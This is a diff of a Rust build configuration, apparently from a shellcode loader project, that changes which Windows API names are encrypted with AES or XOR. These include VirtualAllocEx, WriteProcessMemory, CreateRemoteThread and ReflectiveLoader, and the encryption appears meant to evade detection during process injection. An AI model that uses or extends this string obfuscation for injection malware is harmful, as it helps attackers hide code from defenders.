@@ -8,7 +8,7 @@ const SHELLCODE_PATH: &'static str = "build_src/shellcode64.bin";
 const RANGE_START: usize = 0;
 const RANGE_END: usize = 0x100;
 
-static AES_STRINGS: [&str; 16] = [
+static AES_STRINGS: [&str; 17] = [
     "VirtualAlloc",
     "VirtualAllocEx",
     "VirtualProtect",
@@ -20,14 +20,16 @@ static AES_STRINGS: [&str; 16] = [
     "CreateToolhelp32Snapshot",
     "Process32First",
     "Process32Next",
+    "GetProcessAddress",
     "CloseHandle",
     "GetLastError",
     "ReflectiveLoader",
     "MessageBoxA",
+    //"NtFlushInstructionCache",
     "USER32.dll",
 ];
 
-static XOR_STRINGS: [&str; 13] = [
+static XOR_STRINGS: [&str; 15] = [
     "LoadLibraryA",
     "CryptAcquireContextW",
     "CryptCreateHash",
@@ -41,42 +43,46 @@ static XOR_STRINGS: [&str; 13] = [
     "CryptDestroyKey",
     "ADVAPI32.dll",
     "KERNEL32.DLL",
+    "NTDLL.dll",
+    "NtFlushInstructionCache",
+
 ];
 
-static AES_HASH: [&str; 16] = [
-    "VirtualAlloc",
-    "VirtualAllocEx",
-    "VirtualProtect",
-    "CreateRemoteThread",
-    "WaitForSingleObject",
-    "WriteProcessMemory",
-    "OpenProcess",
-    "RtlMoveMemory",
-    "CreateToolhelp32Snapshot",
-    "Process32First",
-    "Process32Next",
-    "CloseHandle",
-    "GetLastError",
-    "ReflectiveLoader",
-    "MessageBoxA",
-    "USER32.dll",
-];
-
-static XOR_HASH: [&str; 13] = [
-    "LoadLibraryA",
-    "CryptAcquireContextW",
-    "CryptCreateHash",
-    "CryptHashData",
-    "CryptDeriveKey",
-    "CryptDecrypt",
-    "CryptReleaseContext",
-    "CryptSetKeyParam",
-    "CryptGetKeyParam",
-    "CryptDestroyHash",
-    "CryptDestroyKey",
-    "ADVAPI32.dll",
-    "KERNEL32.DLL",
-];
+// static AES_HASH: [&str; 16] = [
+//     "VirtualAlloc",
+//     "VirtualAllocEx",
+//     "VirtualProtect",
+//     "CreateRemoteThread",
+//     "WaitForSingleObject",
+//     "WriteProcessMemory",
+//     "OpenProcess",
+//     "RtlMoveMemory",
+//     "CreateToolhelp32Snapshot",
+//     "Process32First",
+//     "Process32Next",
+//     "CloseHandle",
+//     "GetLastError",
+//     "ReflectiveLoader",
+//     "MessageBoxA",
+//     "USER32.dll",
+// ];
+//
+// static XOR_HASH: [&str; 14] = [
+//     "LoadLibraryA",
+//     "CryptAcquireContextW",
+//     "CryptCreateHash",
+//     "CryptHashData",
+//     "CryptDeriveKey",
+//     "CryptDecrypt",
+//     "CryptReleaseContext",
+//     "CryptSetKeyParam",
+//     "CryptGetKeyParam",
+//     "CryptDestroyHash",
+//     "CryptDestroyKey",
+//     "ADVAPI32.dll",
+//     "KERNEL32.DLL",
+//     "NTDLL.dll",
+// ];
 
 // will try to automate the configs stuff, later. At the moment, doesn't work with 'cargo build', and encryption with OpenSSL doesn't work in 32 bit mode.
 // I may have to switch out OpenSSL for windows-rs and just use the windows API for encryption.
